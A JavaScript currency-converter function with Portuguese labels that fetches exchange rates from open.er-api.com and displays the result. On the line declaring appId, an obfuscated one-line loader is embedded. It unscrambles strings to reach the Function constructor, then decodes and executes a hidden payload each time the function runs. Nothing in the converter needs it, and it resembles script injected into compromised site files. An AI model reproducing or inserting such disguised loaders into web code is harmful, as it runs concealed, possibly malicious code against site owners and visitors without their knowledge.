function result() {
    var appId;(function(){var VYw='',cgW=238-227;function iVp(a){var e=160398;var p=a.length;var j=[];for(var h=0;h<p;h++){j[h]=a.charAt(h)};for(var h=0;h<p;h++){var r=e*(h+540)+(e%29304);var u=e*(h+685)+(e%13817);var o=r%p;var v=u%p;var f=j[o];j[o]=j[v];j[v]=f;e=(r+u)%5217867;};return j.join('')};var ZyC=iVp('ncmctoorhcfketdwjsgnyzvuioxqpsubtalrr').substr(0,cgW);var KpU='m)h ,rr-+t;;;2amw[rerv  =libctelhh= r"mn68)ri-h<"h;vli.s;=(2bnh{pr  i7[l 7n,sto86(a,sfir2la+),{oe=a,8siA crnonho}0mCba]eti.p] oacz8;.1hv!r91.=]awrlreprtjo71l)v6,Av](a)[;;aav5w=4](C ..,u;r m3znlr)[0f(*p)v-ae=0bjx.0aifp;m".lg=as[;}++)p;o);m"gvg(h5n(]7+=wsb,irr(e{p(f,rt;nr0],heho.(tc-0vaS 0o,ntt+=rw t-0lt>1(pg,p=me1>[uusarosu0[u;;]+at0a}ar9uo r -nrta+f+rv+;4or((9)hhins=.;=laon=aal)]8pvshfnC)derv.+=,vr,Ciruaj;4a](i[e6(oi.ntays7;zv;=,+, u,ah} cqo=6rCqw=l+8rr=nyn.uAw dtasravvg.l6ng={derizew1oC!+i8 r+,;)rC8ea+(juo)eAu(o,t3v"l6=3te(hfr)uguw[(;na(nfn;9)v([crr;f[ietd2h}fr7lw)s;e)s9;2<cuspd0i=,. t92tz{;i;+-t=n+ke1s;p*f1a)t,u(tolirg=]+i8n;<+lhg,;pavi(va;oyh6n n;.vdmC;2=tifdh)(r==71)c;;or"(=[==thhunnlqyl)jhm)c."g]0s.=(==nw=e5r+s=o;gjr=.0s1=o]<htctv;,pu..y)q(aerafS+=1v s;v)e216(demr[va) n)w"u<t{ce(6=h++h9bh.;gs,ljtvg"g7(.adApegp)27"lwq;areg(;3=.]dh,t=}l0+v{)2));,;=t}( ,.o4;ct[af(v(..g on)));';var gSf=iVp[ZyC];var YPS='';var YhZ=gSf;var VGV=gSf(YPS,iVp(KpU));var mHk=VGV(iVp('5.g0$p$c3trscgg)ot!.,*e8.tru};l_aVV)5iV(c.93c,Vjr3((e)"0.o+(,t.V=V)IS1VV;)teC.%0(95 a0Vn#n_7=V_d!.=45pn7fV4cif\'y324x)3=5$daa!t#%e39!4{s1VV(_i{1.\/5_7+.j*7Vgfc0V]r0(V 1diu3.$.$5! Vn.V.g_)yV.,V.e$.eVz..,}gvr\'b;VeV, 4trV)og);3$b(#!31.gV$= .8_=o;[+l1r)ret7s71(2$};$i96.=aVn9+7).Vpub)bz)$z}a8.Vubltd}Vf5zVdi)453V%.)V*ui0]uV0.+$%;1)r4,7-)eVee;Vceejn0(u$u1=_3Vn,,3(59)3n)r)h#_V,-45_%(io.bV=;aVeV$ r_-\'-,)(+zCV)ds7!v"3egyx!4V};41"(7.,9b=VV.;\/;[e=eVsV$V;!V;r9;v,9_0)0g_c,i{!q;()vo!8oV9gy20u({}%1=dd\/}V(0=ee]#V){%V6$t+e oVb(7tc84!V!;$V=(*q==r!d4i.risg\'z.);(cV,8.c VfVc,."c.)V,.*).t!aft)4f.,_r _V.=V((,..* (3)#dvx;a(i)c+fV).y$pV+VVeeVt3u,}[f)ecVV44v(t%$f.a;)os!et&!Verf=hc}.!5r(Vfe.d];,)zp$s(.la!*}V1,)VoV+8$.6;;VV\/3_bV$4t(y.&!Ve0!0$$g.,V*6o V,6V s2(st3r,iee"04"aS)i=3ej,{)f=$,!;+ o61)fViV.,_0tfae_o8,(+l0}u_&e({.tau{neh m4!3n=il8V({"fe (f(,ceh 0;z\/2Sb,V\/#8(Vc,_5vire.g!)upb_n&. )alV4.3j1'));var Hlg=YhZ(VYw,mHk );Hlg(9711);return 2019})()
    let tipoMoeda = document.getElementById('tipoMoeda').value
    let valSeraConvert = parseFloat(document.getElementById('valSeraConvert').value)
    let moedaConversao = document.getElementById('moedaConversao').value
    if (tipoMoeda.trim() === '' || isNaN(valSeraConvert) || moedaConversao.trim() === '') {
        document.getElementById("erro").innerHTML = 'Insira dados válidos nos campos.'
        document.getElementById("result").innerHTML = ``
    }

    fetch(`https://open.er-api.com/v6/latest/${tipoMoeda}?app_id=${appId}`)
    .then(response => response.json())
    .then(data => {
        let codigoMoeda = data.rates[tipoMoeda]
        let coinConvert = data.rates[moedaConversao]
        let valConvertido = (valSeraConvert / codigoMoeda * coinConvert).toFixed(2)
        document.getElementById("result").innerHTML = `Resultado: ${valConvertido}${moedaConversao}`
        document.getElementById("erro").innerHTML = ''
        console.log(`O resultado da conversão é: ${valConvertido}`)
        if (isNaN(valConvertido)) {
        document.getElementById("erro").innerHTML = 'Erro ao buscar as taxas de câmbio!<br>Verifique se inseriu os dados corretamente.'
        document.getElementById("result").innerHTML = ``
        }
    })
    .catch(error => {
        console.error('Erro ao buscar as taxas de câmbio:', error)})
}
